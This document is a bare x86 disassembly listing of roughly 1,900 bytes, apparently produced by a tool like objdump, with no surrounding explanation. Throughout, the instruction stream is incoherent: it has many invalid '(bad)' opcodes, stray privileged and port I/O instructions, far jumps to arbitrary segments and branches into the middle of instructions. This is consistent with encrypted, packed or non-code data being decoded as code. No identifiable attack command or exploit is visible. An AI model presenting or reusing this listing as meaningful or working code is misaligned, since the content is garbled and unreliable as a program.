  41762b:	test   eax,0xf1724284
  417630:	sahf   
  417631:	cld    
  417632:	mov    al,ds:0x32a541f9
  417637:	jmp    0xdda3:0xc2a43434
  41763e:	sbb    BYTE PTR [edx-0x80],0x8d
  417642:	test   DWORD PTR [ecx],ecx
  417644:	sub    eax,0xa23684a2
  417649:	enter  0xe388,0xc7
  41764d:	aas    
  41764e:	ror    BYTE PTR [ebx+0x4a613566],0xd8
  417655:	out    0xce,eax
  417657:	retf   
  417658:	jno    0x41765b
  41765a:	popf   
  41765b:	in     al,dx
  41765c:	fwait
  41765d:	jo     0x4176cf
  41765f:	mov    edi,0x8c522cce
  417664:	(bad)  
  417665:	fsubrp st(6),st
  417667:	addr16 or eax,ebx
  41766a:	out    dx,al
  41766b:	scas   eax,DWORD PTR es:[edi]
  41766c:	iret   
  41766d:	je     0x4175f1
  41766f:	pop    esp
  417670:	popf   
  417671:	push   ss
  417672:	inc    esp
  417673:	xor    BYTE PTR ds:0xe089b583,bl
  417679:	outs   dx,DWORD PTR ds:[si]
  41767b:	imul   edi,DWORD PTR [eax+0xe0a0638],0xdb615fe5
  417685:	sub    eax,0x99d62390
  41768a:	inc    edi
  41768b:	adc    al,BYTE PTR [ebx]
  41768d:	ret    0x4ad5
  417690:	frstor [ecx]
  417692:	fisub  DWORD PTR [esi+0x5f]
  417695:	adc    esp,ecx
  417697:	cs icebp 
  417699:	cmp    eax,0xa29bb72b
  41769e:	dec    eax
  41769f:	imul   esi,DWORD PTR [edi+0x7c],0xffffffa7
  4176a3:	retf   0xe775
  4176a6:	popf   
  4176a7:	mov    bl,0x85
  4176a9:	icebp  
  4176aa:	(bad)
  4176ae:	stos   BYTE PTR es:[edi],al
  4176af:	loop   0x417684
  4176b1:	ror    DWORD PTR [ebx-0x29e220b6],1
  4176b7:	add    DWORD PTR [edx+0x4c],esp
  4176ba:	xlat   BYTE PTR ds:[ebx]
  4176bb:	dec    ecx
  4176bc:	xchg   ecx,eax
  4176bd:	iret   
  4176be:	push   es
  4176bf:	ret    
  4176c0:	xor    eax,0xb29363b8
  4176c5:	mov    cs,WORD PTR [eax-0x528b640a]
  4176cb:	scas   eax,DWORD PTR es:[edi]
  4176cc:	pop    ds
  4176cd:	es call 0x943be98c
  4176d3:	mov    edx,0x70c3de62
  4176d8:	inc    edi
  4176d9:	sub    BYTE PTR [esi-0xfbf647f],al
  4176df:	mov    es,WORD PTR [eax]
  4176e1:	mov    al,0xa0
  4176e3:	mov    edi,0x4a64c7d0
  4176e8:	out    dx,eax
  4176e9:	fdiv   DWORD PTR [edi]
  4176eb:	push   es
  4176ec:	cs stc 
  4176ee:	mov    ch,0x9e
  4176f0:	imul   DWORD PTR [edi+esi*2+0x4a]
  4176f4:	mov    edi,0xb2cde6f9
  4176f9:	lock or BYTE PTR [edx+0x33],0xc9
  4176fe:	cwde   
  4176ff:	rol    BYTE PTR [eax],1
  417701:	nop
  417702:	dec    ebx
  417703:	sub    DWORD PTR [ecx-0x64b50775],edi
  417709:	mov    eax,ds:0xc81d7fff
  41770e:	mov    dl,ah
  417710:	pop    esp
  417711:	in     eax,0xbb
  417713:	cmp    al,0xcc
  417715:	stos   DWORD PTR es:[edi],eax
  417716:	cmp    al,0xea
  417718:	jle    0x417795
  41771a:	daa    
  41771b:	popa   
  41771c:	fwait
  41771d:	(bad)
  417720:	inc    ebp
  417721:	dec    ebx
  417722:	cld    
  417723:	stos   DWORD PTR es:[edi],eax
  417724:	(bad)  
  417725:	fld    QWORD PTR [edx]
  417727:	add    eax,0x54aba862
  41772c:	or     edi,edi
  41772e:	sahf   
  41772f:	aas    
  417730:	out    dx,al
  417731:	ror    DWORD PTR ss:[ecx+0x7e850b1f],cl
  417738:	mov    ebp,0x5549ca75
  41773d:	xlat   BYTE PTR ds:[ebx]
  41773e:	pop    esp
  41773f:	pop    ecx
  417740:	adc    eax,0x9b880ccd
  417745:	and    ecx,0xffffffa8
  417748:	int    0x74
  41774a:	lods   al,BYTE PTR ds:[esi]
  41774b:	adc    DWORD PTR [esi-0x21],0x310b99d6
  417752:	jl     0x4176de
  417754:	call   0x9be9c90a
  417759:	imul   ebx,DWORD PTR [ebp+0x10163e14],0xa4ddaca5
  417763:	jne    0x417795
  417765:	sahf   
  417766:	or     DWORD PTR [ebp+0x2d99b3b6],edx
  41776c:	xchg   esp,eax
  41776d:	mov    BYTE PTR [eax-0x36],ch
  417770:	daa    
  417771:	jns    0x417760
  417773:	push   0x8531ddcd
  417778:	mov    ds:0x88c6a129,eax
  41777d:	adc    eax,0xe455d190
  417782:	jg     0x417728
  417784:	or     eax,0xb04a89ea
  417789:	idiv   BYTE PTR [edx]
  41778b:	sbb    ecx,DWORD PTR [ecx]
  41778d:	(bad)  
  41778e:	repnz sbb DWORD PTR [ebx-0x6f50b504],ebx
  417795:	rcl    BYTE PTR [ebx-0x6f21aec3],1
  41779b:	xor    BYTE PTR [ebp+0x5aa2360e],al
  4177a1:	cli    
  4177a2:	retf   
  4177a3:	bswap  esi
  4177a5:	pop    ebp
  4177a6:	adc    BYTE PTR [ecx+0x4624e252],dl
  4177ac:	sbb    esi,ebx
  4177ae:	jl     0x417766
  4177b0:	daa    
  4177b1:	xchg   edx,eax
  4177b2:	das    
  4177b3:	mov    ah,0x46
  4177b5:	enter  0x6690,0x2b
  4177b9:	in     eax,dx
  4177ba:	sbb    BYTE PTR [esi],dh
  4177bc:	jnp    0x4177b0
  4177be:	pop    ebx
  4177bf:	dec    edx
  4177c0:	es adc al,0xf8
  4177c3:	and    edx,DWORD PTR [edi-0x7d]
  4177c6:	adc    bh,BYTE PTR [ecx+ebp*4+0x3f75e99c]
  4177cd:	(bad)  
  4177ce:	fsubrp st(2),st
  4177d0:	ins    DWORD PTR es:[edi],dx
  4177d1:	and    BYTE PTR [esi+0x4a],dh
  4177d4:	xor    eax,0xb880381
  4177d9:	mov    eax,ds:0xbb9b272f
  4177de:	xor    cl,BYTE PTR [edi+edi*1+0x18]
  4177e2:	in     al,dx
  4177e3:	sub    al,0x1d
  4177e5:	fcom   DWORD PTR [ebp+0x1a166858]
  4177eb:	out    0x5b,eax
  4177ed:	jmp    DWORD PTR ds:0xa694d047
  4177f3:	and    bl,BYTE PTR [edx+0x75]
  4177f6:	xchg   ecx,eax
  4177f7:	add    ebx,0x18
  4177fa:	mov    ah,0xfe
  4177fc:	mov    BYTE PTR [esp+eax*8+0x54de1706],dl
  417803:	gs pop ebp
  417805:	icebp  
  417806:	pushf  
  417807:	cmp    eax,0x9e919562
  41780c:	(bad)  
  41780d:	repnz fwait
  41780f:	ins    DWORD PTR es:[edi],dx
  417810:	xchg   ebx,eax
  417811:	push   ecx
  417812:	mov    al,0x97
  417814:	add    eax,0xad3b11de
  417819:	inc    edx
  41781a:	arpl   WORD PTR [edi-0x7a],dx
  41781d:	inc    eax
  41781e:	nop
  41781f:	jno    0x41780e
  417821:	fs jge 0x4177bf
  417824:	data16 lods al,BYTE PTR ds:[esi]
  417826:	mov    cl,BYTE PTR [edx+0x3a]
  417829:	adc    al,0xb0
  41782b:	mov    esi,DWORD PTR [ebx]
  41782d:	pop    eax
  41782e:	cld    
  41782f:	jo     0x4177db
  417831:	push   esi
  417832:	push   cs
  417833:	pop    esi
  417834:	test   BYTE PTR [esi],bl
  417836:	mov    ds:0xd73373cd,eax
  41783b:	dec    esp
  41783c:	stos   BYTE PTR es:[edi],al
  41783d:	mov    esp,0x53811bda
  417842:	pusha  
  417843:	loope  0x417876
  417845:	cli    
  417846:	xchg   esi,eax
  417847:	call   0xeecb:0x2556b1ee
  41784e:	and    ecx,DWORD PTR [esi+ebp*2]
  417851:	(bad)  
  417852:	test   DWORD PTR [ecx+0x7c],0x4358a02c
  417859:	xchg   esi,eax
  41785a:	sbb    BYTE PTR [edi],ch
  41785c:	fwait
  41785d:	adc    DWORD PTR ds:0xe9c02c34,eax
  417863:	mov    ecx,0x82c6ddc9
  417868:	in     eax,dx
  417869:	jbe    0x417839
  41786b:	clc    
  41786c:	push   ebp
  41786d:	aam    0x90
  41786f:	shl    DWORD PTR [eax+0x43eae860],cl
  417875:	xchg   esp,eax
  417876:	jmp    0x4178c1
  417878:	aas    
  417879:	xor    cl,BYTE PTR [eax-0x3f47d93a]
  41787f:	inc    edx
  417880:	fwait
  417881:	cld    
  417882:	push   cs
  417883:	mov    ebp,0xe18ddc49
  417888:	push   0xf8110fa
  41788d:	jnp    0x41783a
  41788f:	inc    ebp
  417890:	sbb    ebx,DWORD PTR [ebp+0x70018402]
  417896:	add    eax,0xcd58b98b
  41789b:	cmp    bl,bl
  41789d:	or     al,0xd4
  41789f:	mov    cl,0xe7
  4178a1:	cmp    al,0xb0
  4178a3:	dec    edx
  4178a4:	ret    
  4178a5:	adc    dh,ch
  4178a7:	dec    edi
  4178a8:	cmp    eax,0x5c3a59b0
  4178ad:	jno    0x417846
  4178af:	shld   ecx,ebp,cl
  4178b2:	outs   dx,BYTE PTR ds:[esi]
  4178b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178b4:	or     edi,DWORD PTR [edx+0x0]
  4178b7:	in     eax,0x8a
  4178b9:	jmp    0xb01439f9
  4178be:	xchg   ecx,eax
  4178bf:	mov    bl,BYTE PTR [edi+0x3f0a727d]
  4178c5:	add    dl,BYTE PTR [eax-0x37ce01f4]
  4178cb:	mov    ds:0x49bf2b0c,al
  4178d0:	or     eax,0xf80ebde5
  4178d5:	add    BYTE PTR [ebp+0x77],ah
  4178d8:	rol    BYTE PTR [esi+0x23],1
  4178db:	jbe    0x417879
  4178dd:	loop   0x4178b8
  4178df:	add    bh,0xbe
  4178e2:	adc    esp,esi
  4178e4:	or     BYTE PTR ds:0xdece07e,cl
  4178ea:	sub    edi,DWORD PTR ds:0xe88cd14b
  4178f0:	fwait
  4178f1:	loop   0x41796d
  4178f3:	in     al,dx
  4178f4:	aas    
  4178f5:	dec    eax
  4178f6:	xor    BYTE PTR fs:[esi-0x1c15e220],bl
  4178fd:	and    bl,bl
  4178ff:	inc    esi
  417900:	arpl   WORD PTR [edx+0x78b72d80],bx
  417906:	fstp   DWORD PTR ds:[ebx]
  417909:	pop    edi
  41790a:	add    ecx,DWORD PTR [edi]
  41790c:	xor    al,0x5c
  41790e:	xor    DWORD PTR [edx+0x4c],ecx
  417911:	stc    
  417912:	jae    0x41797f
  417914:	sbb    ebx,esp
  417916:	pushf  
  417917:	push   eax
  417918:	fwait
  417919:	adc    bl,BYTE PTR [ebx+0x5ee5a93f]
  41791f:	add    DWORD PTR [eax],0xffffffdf
  417922:	jge    0x41797d
  417924:	jno    0x4178b3
  417926:	add    esi,DWORD PTR [edi]
  417928:	lods   al,BYTE PTR ds:[esi]
  417929:	mov    ebp,0xce9b7df3
  41792e:	repnz mov WORD PTR [ecx],fs
  417931:	dec    ecx
  417932:	sub    DWORD PTR [ecx],0xfffffff1
  417935:	stc    
  417936:	jmp    0xfc1f2223
  41793b:	pop    es
  41793c:	push   esi
  41793d:	out    0xdc,al
  41793f:	pushf  
  417940:	pushf  
  417941:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417942:	(bad)  
  417943:	cwde   
  417944:	rsm    
  417946:	(bad)  [ebp+0x6b]
  417949:	mov    edi,0x34ce4a15
  41794e:	mov    edx,0x3a36b59a
  417953:	jle    0x4178f9
  417955:	cmp    esp,DWORD PTR [ecx+eiz*4-0x7626a192]
  41795c:	(bad)  
  41795e:	add    DWORD PTR [edx+0x54],ecx
  417961:	gs mov cl,0x55
  417964:	scas   al,BYTE PTR es:[edi]
  417965:	add    esp,DWORD PTR [esi+0x66]
  417968:	fwait
  417969:	adc    al,0x8b
  41796b:	mov    eax,ds:0xdf18e9c
  417970:	and    ch,bh
  417972:	cwde   
  417973:	xor    ebx,edi
  417975:	pop    ebp
  417976:	cmp    BYTE PTR [eax-0x30],dl
  417979:	out    0xb9,eax
  41797b:	push   ebp
  41797c:	cdq    
  41797d:	fcom   DWORD PTR [eax-0x434414d4]
  417983:	mov    bl,0x36
  417985:	dec    ebx
  417986:	lods   al,BYTE PTR ds:[esi]
  417987:	dec    ecx
  417988:	pop    ss
  417989:	jg     0x4179fa
  41798b:	xor    al,0x34
  41798d:	push   esi
  41798e:	pusha  
  41798f:	xor    DWORD PTR [ebx-0x4d476a33],ebx
  417995:	mov    ebp,0x1bd6d081
  41799a:	sti    
  41799b:	sub    al,0x9b
  41799d:	add    esi,0x6b8cf2cc
  4179a3:	repnz fwait
  4179a5:	out    0xae,eax
  4179a7:	sub    eax,0x97ebf279
  4179ac:	and    ebx,esi
  4179ae:	test   al,0x7a
  4179b0:	mov    al,ds:0x6522b326
  4179b5:	leave  
  4179b6:	nop
  4179b7:	xlat   BYTE PTR ds:[ebx]
  4179b8:	cmc    
  4179b9:	push   ebp
  4179ba:	jno    0x417967
  4179bc:	pop    ebp
  4179bd:	add    cl,BYTE PTR [ebx]
  4179bf:	dec    edx
  4179c0:	aad    0x46
  4179c2:	and    al,0xce
  4179c4:	pop    esi
  4179c5:	xor    edi,DWORD PTR [eax]
  4179c7:	xor    al,0x9b
  4179c9:	pop    ebp
  4179ca:	push   esi
  4179cb:	push   0x32
  4179cd:	das    
  4179ce:	leave  
  4179cf:	dec    ebx
  4179d0:	test   al,0x1b
  4179d2:	loopne 0x417a2c
  4179d4:	sbb    edx,DWORD PTR [ecx]
  4179d6:	call   0xf47f7bae
  4179db:	fs fwait
  4179dd:	out    0xc1,al
  4179df:	stos   BYTE PTR es:[edi],al
  4179e0:	or     al,0x4d
  4179e2:	leave  
  4179e3:	xor    al,0xe4
  4179e5:	sub    DWORD PTR ds:0x2934a0ad,esp
  4179eb:	imul   esp,DWORD PTR [edx],0x37d5405e
  4179f1:	sbb    DWORD PTR [ecx-0x4a22d8b],edx
  4179f7:	iret   
  4179f8:	rcr    bh,1
  4179fa:	iret   
  4179fb:	jmp    0x584836e2
  417a00:	out    dx,eax
  417a01:	lds    edi,FWORD PTR [ecx+0x7475b71]
  417a07:	inc    ebp
  417a08:	mov    ds:0x6aa79063,al
  417a0d:	push   cs
  417a0e:	sahf   
  417a0f:	pop    edx
  417a10:	and    BYTE PTR [eax+0x60],bh
  417a13:	pop    eax
  417a14:	sti    
  417a15:	icebp  
  417a16:	(bad)  
  417a17:	bound  edi,QWORD PTR [ebx+0x4c7abaf0]
  417a1d:	cmp    dl,BYTE PTR [ecx+0x581eefbd]
  417a23:	inc    ecx
  417a24:	xchg   ebp,eax
  417a25:	sbb    bh,BYTE PTR [eax-0x79]
  417a28:	inc    ecx
  417a29:	fimul  WORD PTR [eax]
  417a2b:	jae    0x417a2e
  417a2d:	jns    0x417a07
  417a2f:	data16 xor ah,0x8f
  417a33:	ins    BYTE PTR es:[edi],dx
  417a34:	call   DWORD PTR [edi+eiz*2]
  417a37:	sahf   
  417a38:	cmc    
  417a39:	mov    eax,0xf65449e1
  417a3e:	sar    DWORD PTR [ebx-0x61],cl
  417a41:	fdiv   st,st(5)
  417a43:	aam    0x9e
  417a45:	cwde   
  417a46:	add    BYTE PTR [esi],dh
  417a48:	rcr    DWORD PTR [edi+0x6b49221c],1
  417a4e:	jg     0x417a9a
  417a50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a52:	jo     0x417a94
  417a54:	in     al,0x78
  417a56:	lock jae 0x417a20
  417a59:	cmp    ecx,DWORD PTR [eax+eiz*4]
  417a5c:	fwait
  417a5d:	test   al,0x40
  417a5f:	jmp    0x4179ee
  417a61:	je     0x417a52
  417a63:	dec    ecx
  417a64:	xor    eax,0x16d33abd
  417a69:	stc    
  417a6a:	jnp    0x417a27
  417a6c:	fwait
  417a6d:	adc    dh,ah
  417a6f:	jp     0x417ad8
  417a71:	out    0x6b,al
  417a73:	sbb    al,bh
  417a75:	push   ss
  417a76:	(bad)  
  417a77:	sbb    DWORD PTR [ebx+0x23],ecx
  417a7a:	mov    eax,0x9e385814
  417a7f:	out    0x69,al
  417a81:	cdq    
  417a82:	or     al,0xaa
  417a84:	mov    dl,0xaf
  417a86:	cmovne eax,DWORD PTR [edi-0x22]
  417a8a:	scas   al,BYTE PTR es:[edi]
  417a8b:	or     BYTE PTR [edi+0xb0b2870],0x5f
  417a92:	xchg   edi,eax
  417a93:	es jl  0x417a6e
  417a96:	ret    
  417a97:	outs   dx,BYTE PTR ds:[esi]
  417a98:	fwait
  417a99:	stos   BYTE PTR es:[edi],al
  417a9a:	in     eax,dx
  417a9b:	iret   
  417a9c:	xor    al,0xbe
  417a9e:	mov    ecx,DWORD PTR [eax-0x216e11cf]
  417aa4:	mov    edi,eax
  417aa6:	or     eax,0xea9c5b6d
  417aab:	sbb    DWORD PTR [ebx-0x6eb3099f],0x7bd51ffc
  417ab5:	rcr    BYTE PTR [ebx+0x55934649],cl
  417abb:	fs loope 0x417adc
  417abe:	push   esi
  417abf:	xlat   BYTE PTR ds:[ebx]
  417ac0:	fwait
  417ac1:	out    dx,eax
  417ac2:	xchg   edi,eax
  417ac4:	sbb    ebp,eax
  417ac6:	mov    al,0xae
  417ac8:	test   al,0xdd
  417aca:	fwait
  417acb:	pop    edx
  417acc:	mov    ebx,esp
  417ace:	push   cs
  417acf:	cwde   
  417ad0:	jne    0x417af4
  417ad2:	xchg   edi,eax
  417ad3:	mov    ebx,0x8c01338c
  417ad8:	cmp    esp,DWORD PTR [ebx-0x21e9e5eb]
  417ade:	fmul   QWORD PTR [edi+0x3c]
  417ae1:	pop    eax
  417ae2:	jno    0x417b55
  417ae4:	cmp    esi,DWORD PTR [edx]
  417ae6:	nop
  417ae7:	cli    
  417ae8:	mov    ecx,0xdff0d2e
  417aed:	fs jo  0x417b3a
  417af0:	cmp    BYTE PTR [esp+esi*1+0x7c],al
  417af4:	mov    bl,0xc8
  417af6:	fld    TBYTE PTR [ebp+0x6a9e9e2b]
  417afc:	mov    esp,cs
  417afe:	shr    BYTE PTR [ecx+0x3cc18932],0x4c
  417b05:	fsubp  st(6),st
  417b07:	jae    0x417a8a
  417b09:	mov    al,0xfb
  417b0b:	enter  0x9b7e,0x80
  417b0f:	lods   al,BYTE PTR ds:[esi]
  417b10:	fwait
  417b11:	xlat   BYTE PTR ds:[ebx]
  417b12:	idiv   BYTE PTR [edi-0xa2dd9f8]
  417b18:	js     0x417af9
  417b1a:	daa    
  417b1b:	aam    0x8f
  417b1d:	std    
  417b1e:	sbb    edx,DWORD PTR [ecx-0x18]
  417b21:	(bad)  
  417b22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b23:	push   ds
  417b24:	arpl   dx,cx
  417b26:	das    
  417b27:	xor    DWORD PTR [ebx+0x1b39e0b5],ebx
  417b2d:	pop    ss
  417b2e:	fdiv   DWORD PTR [edx]
  417b30:	mov    ah,0xdd
  417b32:	call   0xdb44:0x9a539258
  417b39:	sbb    al,0x8a
  417b3b:	jl     0x417aca
  417b3d:	xchg   edx,eax
  417b3e:	xchg   ebx,eax
  417b3f:	adc    BYTE PTR [edx-0x150d0494],al
  417b45:	adc    BYTE PTR [eax-0x46],0x8
  417b49:	pop    eax
  417b4a:	xor    al,0x4a
  417b4c:	dec    ecx
  417b4d:	cli    
  417b4e:	add    edi,DWORD PTR [edi+0x2]
  417b51:	jge    0x417b63
  417b53:	rcr    DWORD PTR [ecx-0x3f9f6f45],cl
  417b59:	aam    0x1c
  417b5b:	push   0xffffffbc
  417b5d:	mov    DWORD PTR [edx+0x62572d4f],0xd85da00f
  417b67:	in     al,0xb8
  417b69:	pop    esi
  417b6a:	nop
  417b6b:	sub    bh,BYTE PTR [edx]
  417b6d:	rcr    BYTE PTR [edx-0x23],0x3f
  417b71:	cmp    dh,BYTE PTR [esi+0x4a]
  417b74:	std    
  417b75:	pop    edx
  417b76:	int3   
  417b77:	dec    ebx
  417b78:	or     BYTE PTR [edi+0x3cba0af0],dh
  417b7e:	test   DWORD PTR [eax],0xe5c1b222
  417b84:	pop    ebx
  417b85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b86:	xchg   DWORD PTR [ecx+edx*2-0x7ed7eb22],edi
  417b8d:	pop    ds
  417b8e:	(bad)  
  417b8f:	dec    edi
  417b90:	cmp    esi,ecx
  417b92:	sub    cl,dh
  417b94:	fwait
  417b95:	push   cs
  417b96:	jmp    0x417b96
  417b98:	dec    ebx
  417b99:	rol    BYTE PTR [ecx+0x28de1f5e],cl
  417b9f:	inc    ebx
  417ba0:	sbb    eax,0xeec2b58f
  417ba5:	test   eax,0x939bdf82
  417baa:	lahf   
  417bab:	pop    ecx
  417bac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417bad:	sub    eax,0xf9ce2f91
  417bb2:	sti    
  417bb3:	aas    
  417bb4:	repz sbb eax,0x20219ccc
  417bba:	fidivr WORD PTR ds:0xca2724da
  417bc0:	cli    
  417bc1:	sti    
  417bc2:	pop    ebp
  417bc3:	mov    bl,0x83
  417bc5:	mov    gs,esi
  417bc7:	dec    ecx
  417bc8:	adc    ch,BYTE PTR [edi-0x72]
  417bcb:	jmp    0x544a0d01
  417bd0:	aad    0xc0
  417bd2:	push   ecx
  417bd3:	dec    edx
  417bd4:	test   DWORD PTR [ebx-0x1be2e71d],0x23ea49fd
  417bde:	push   esi
  417bdf:	dec    BYTE PTR [edx]
  417be1:	js     0x417c32
  417be3:	bound  ebx,QWORD PTR [ebx-0x271254f8]
  417be9:	(bad)  
  417bea:	leave  
  417beb:	pushw  0xadf
  417bef:	push   esi
  417bf0:	cli    
  417bf1:	inc    eax
  417bf2:	fcomi  st,st(3)
  417bf4:	es mov eax,ds:0x55319b31
  417bfb:	and    bl,bl
  417bfd:	xor    BYTE PTR [ebx],dl
  417bff:	dec    edi
  417c00:	dec    edi
  417c01:	mov    edi,0xde144074
  417c06:	arpl   bp,sp
  417c08:	push   0xffffffea
  417c0a:	sub    cl,cl
  417c0c:	out    0xae,al
  417c0e:	nop
  417c0f:	ins    DWORD PTR es:[edi],dx
  417c10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c11:	xor    eax,0xbdaf0a20
  417c16:	neg    BYTE PTR [edi-0x58]
  417c19:	bound  eax,QWORD PTR [ecx]
  417c1b:	dec    edx
  417c1c:	xchg   edi,eax
  417c1d:	test   al,0xc6
  417c1f:	sub    BYTE PTR [esi+eiz*2],bl
  417c22:	nop
  417c23:	mov    ebx,es
  417c25:	mov    BYTE PTR [edi],ch
  417c27:	push   cs
  417c28:	inc    eax
  417c29:	je     0x417bf5
  417c2b:	dec    ecx
  417c2c:	push   ebx
  417c2d:	pop    eax
  417c2e:	pop    edi
  417c2f:	out    0x8,eax
  417c31:	aaa    
  417c32:	add    edi,DWORD PTR [edx+0x2b285a9b]
  417c38:	aam    0x3e
  417c3a:	inc    edi
  417c3b:	jecxz  0x417c4c
  417c3d:	sbb    eax,0xbb89169
  417c42:	fimul  WORD PTR [ecx-0x8]
  417c45:	and    DWORD PTR [ecx+edx*8],ebp
  417c48:	ficomp DWORD PTR [esi]
  417c4a:	add    eax,0x203bff2
  417c4f:	call   FWORD PTR [eax+eiz*8-0x33b90569]
  417c56:	fs xor eax,0xb3b6de52
  417c5c:	scas   al,BYTE PTR es:[edi]
  417c5d:	std    
  417c5e:	mov    ebp,0x906b2caa
  417c63:	cmp    eax,0x6243b1eb
  417c68:	xor    BYTE PTR [edx-0x45],dl
  417c6b:	dec    ecx
  417c6c:	cs inc ecx
  417c6e:	sbb    BYTE PTR [ebx],0x70
  417c71:	lock sub al,0xd8
  417c74:	sahf   
  417c75:	out    0xa4,eax
  417c77:	xchg   DWORD PTR [edi+eax*8+0x3dcbca15],ecx
  417c7e:	mulps  xmm4,XMMWORD PTR [ecx-0x4985057]
  417c85:	and    ah,bl
  417c87:	mov    ah,0xc6
  417c89:	mov    eax,0xab9b0603
  417c8e:	repz sbb BYTE PTR fs:[edx-0x4],dl
  417c93:	test   al,0x60
  417c95:	fidiv  WORD PTR [ebx+edx*2]
  417c98:	lock imul BYTE PTR [ecx]
  417c9b:	outs   dx,BYTE PTR ds:[esi]
  417c9c:	or     edi,DWORD PTR [ebx]
  417c9e:	fwait
  417c9f:	mov    bl,0xa1
  417ca1:	mov    ?,ebp
  417ca3:	leave  
  417ca4:	push   es
  417ca5:	in     eax,dx
  417ca6:	pop    esi
  417ca7:	jae    0x417c37
  417ca9:	in     eax,0x34
  417cab:	xor    bl,cl
  417cad:	cmc    
  417cae:	and    eax,0xeca4eada
  417cb3:	mov    ah,0x9b
  417cb5:	in     eax,dx
  417cb6:	push   0x42
  417cb8:	shl    DWORD PTR [eax-0x223d3999],1
  417cbe:	(bad)  
  417cc0:	mov    ch,0xc2
  417cc2:	rol    DWORD PTR [esi-0x31],1
  417cc5:	(bad)  [esi+edi*4+0x67e3959b]
  417ccc:	sbb    BYTE PTR [edi+0x30],ch
  417ccf:	call   0x2e995a7f
  417cd4:	mov    dh,bl
  417cd6:	mov    ah,0x48
  417cd8:	(bad)  
  417cd9:	jg     0x417c6b
  417cdb:	jb     0x417ce2
  417cdd:	pushf  
  417cde:	ds (bad) 
  417ce0:	jle    0x417c72
  417ce2:	sub    al,0x4a
  417ce4:	mov    ds:0x95291e2b,eax
  417ce9:	sbb    eax,0x439b670b
  417cee:	je     0x417d2f
  417cf0:	lods   eax,DWORD PTR ds:[esi]
  417cf1:	cmp    al,0x5e
  417cf3:	push   esp
  417cf4:	int3   
  417cf5:	frstor [edx+0xe925dee]
  417cfb:	jno    0x417d0e
  417cfd:	das    
  417cfe:	nop
  417cff:	jmp    0x417ca4
  417d01:	imul   DWORD PTR [edx]
  417d03:	outs   dx,BYTE PTR ds:[esi]
  417d04:	xchg   edx,eax
  417d05:	fstp   TBYTE PTR [edx]
  417d07:	leave  
  417d08:	daa    
  417d09:	in     al,dx
  417d0a:	add    al,0xb5
  417d0c:	je     0x417ca2
  417d0e:	mov    al,0x5
  417d10:	js     0x417d56
  417d12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d13:	xchg   edi,eax
  417d14:	xlat   BYTE PTR ds:[ebx]
  417d15:	fs mov edx,cs
  417d18:	repnz stos BYTE PTR es:[edi],al
  417d1a:	xchg   DWORD PTR [ecx-0x79f35b2e],ecx
  417d20:	mov    bh,BYTE PTR [edi+ebp*4]
  417d23:	pop    ss
  417d24:	pop    ecx
  417d25:	sahf   
  417d26:	or     edi,DWORD PTR [eax+0x7a]
  417d29:	jnp    0x417da0
  417d2b:	add    bl,BYTE PTR [ebx+0x3349424e]
  417d31:	outs   dx,DWORD PTR ds:[esi]
  417d32:	and    dl,BYTE PTR [ebp-0x7abce5c6]
  417d38:	pop    eax
  417d39:	mov    ss,WORD PTR [eax]
  417d3b:	stc    
  417d3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d3d:	jbe    0x417d1d
  417d3f:	push   cs
  417d40:	rcl    DWORD PTR [eax],1
  417d42:	mov    BYTE PTR [esi-0x28],al
  417d45:	and    BYTE PTR [esi],al
  417d47:	retf   0x83fb
  417d4a:	shl    DWORD PTR [eax+0x49a3ca5c],0xd5
  417d51:	jb     0x417dab
  417d53:	(bad)  
  417d54:	xlat   BYTE PTR ds:[ebx]
  417d55:	(bad)  
  417d56:	std    
  417d57:	ins    BYTE PTR es:[edi],dx
  417d58:	fwait
  417d59:	and    al,0x4a
  417d5b:	arpl   si,sp
  417d5d:	sub    DWORD PTR es:[eax+0x10],esp
  417d61:	fiadd  WORD PTR [edx]
  417d63:	out    0x33,al
  417d65:	adc    dh,dl
  417d67:	stc    
  417d68:	out    0x53,eax
  417d6a:	xchg   edi,eax
  417d6b:	aam    0xde
  417d6d:	(bad)  
  417d70:	retf   
  417d71:	les    ebx,FWORD PTR [eax-0x27219012]
  417d77:	sti    
  417d78:	adc    al,BYTE PTR [edi]
  417d7a:	jmp    0x7b17d657
  417d7f:	add    ebx,eax
  417d81:	xchg   edi,eax
  417d82:	test   edx,ecx
  417d84:	lods   al,BYTE PTR ds:[esi]
  417d85:	aaa    
  417d86:	add    al,0xad
  417d88:	leave  
  417d89:	add    DWORD PTR [edi+0x4b],0x64
  417d8d:	jmp    0x417da2
  417d8f:	mov    bl,ah
  417d91:	and    BYTE PTR [edi-0x36],cl
  417d94:	popf   
  417d95:	(bad)  
  417d96:	xor    eax,0xd96d2b7c
  417d9b:	dec    ecx
  417d9c:	ficom  DWORD PTR [ebx]
  417d9e:	shr    DWORD PTR [edi],0xd9
  417da1:	arpl   WORD PTR ds:0x2948308,ax
  417da7:	push   ecx
  417da8:	fwait
  417da9:	xor    eax,DWORD PTR gs:[esi+0x7a6b3189]
  417db0:	and    eax,0x710718de
  417db5:	or     DWORD PTR [eax+0x42],edx
  417db8:	add    dl,BYTE PTR [esi-0x5482ab8]
  417dbe:	mov    dh,0xa3
  417dc0:	mov    al,ds:0x1bbf10a9
  417dc5:	sbb    esi,esi
  417dc7:	call   0x63f9:0xa8e1de39
  417dce:	(bad)  
  417dcf:	jno    0x417e20
  417dd1:	sub    DWORD PTR [edi-0x6c3025bb],0x3a0e4e22
  417ddb:	retf   0xdc55
  417dde:	cmp    BYTE PTR [ebx-0x61],cl
  417de1:	jg     0x417dce
  417de3:	mov    ecx,0xaa4030c2
  417de8:	xchg   edi,eax
  417de9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417dea:	nop
  417deb:	scas   eax,DWORD PTR es:[edi]
  417dec:	loop   0x417d96
  417dee:	pushf  
  417def:	mov    al,ds:0x4a8914dc
  417df4:	in     eax,dx
  417df5:	mov    es:0x25ec15e2,al
  417dfb:	or     bh,BYTE PTR [eax-0x214c9af9]
